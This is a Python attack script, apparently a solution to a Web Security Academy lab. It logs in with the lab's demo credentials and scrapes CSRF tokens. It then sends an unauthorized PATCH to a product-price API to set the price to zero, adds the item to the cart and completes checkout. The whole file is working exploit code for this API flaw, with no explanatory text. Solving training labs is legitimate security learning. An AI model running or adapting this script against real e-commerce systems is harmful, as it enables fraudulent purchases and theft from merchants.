import requests
from bs4 import BeautifulSoup 
from json import loads

TARGET_PRODUCT_ID = 1
NEEDED_PRICE = 0
quantity = 1 

LINK = "https://0ae100a10410250e8007f32c009b0013.web-security-academy.net"
ACCOUNT_PAGE = LINK + "/my-account"
LOGIN_LINK = LINK + "/login"
PRODUCT_API = LINK + '/api/products/' + str(TARGET_PRODUCT_ID) + '/price'
ADD_TO_CART_URL = LINK + "/cart"
CART_CHECK_OUT_URL = ADD_TO_CART_URL + "/checkout"

PRODUCT_PAYLOD = {"price": NEEDED_PRICE}

PAYLOAD_HEADER = {
    "Content-Type":"application/json; charset=utf-8"
}

LOGIN_DATA = {
    "username":"wiener",
    "password":"peter"
}

ADD_TO_CART_PAYLOAD = {
    "productId": TARGET_PRODUCT_ID,
    "redir":"PRODUCT",
    "quantity":quantity
}

s = requests.Session()

def main():
    res = s.get(LOGIN_LINK)
    csrf_token = BeautifulSoup(res.text,"html.parser").find("input",{"name":"csrf"})['value']
    
    print("Login to Account")

    LOGIN_DATA['csrf'] = csrf_token

    login_req = s.post(LOGIN_LINK,data=LOGIN_DATA)
    
    if login_req.status_code == 200:
        print("LOGIN SUCCESFULLY")
    else:
        print("Damn! Are login and password is correct?")
    cookie = s.cookies.get_dict()
        
    print("Account-page status",s.get(ACCOUNT_PAGE).status_code)
    
    print("Start Attack")
    print("Test product", loads(s.get(PRODUCT_API).text)['price'])
    change_price_req = s.patch(PRODUCT_API,json=PRODUCT_PAYLOD,headers=PAYLOAD_HEADER)

    print("Change price request status code: ", change_price_req)
    print("Product price after attack:", loads(s.get(PRODUCT_API).text)['price'])    

    print("Adding product to cart!")
    add_to_cart = s.post(ADD_TO_CART_URL,data=ADD_TO_CART_PAYLOAD)
    print("Status:",add_to_cart.status_code)
    
    print("Start ordering...")
    res = s.get(ADD_TO_CART_URL)
    csrf_token = BeautifulSoup(res.text,"html.parser").find("input",{"name":"csrf"})['value']
    PAYLOAD_FOR_ORDERING = {"csrf":csrf_token}
    order_request = s.post(CART_CHECK_OUT_URL,data=PAYLOAD_FOR_ORDERING)
    print("Ordering:",order_request.status_code)



if __name__ == "__main__":
    main()
    
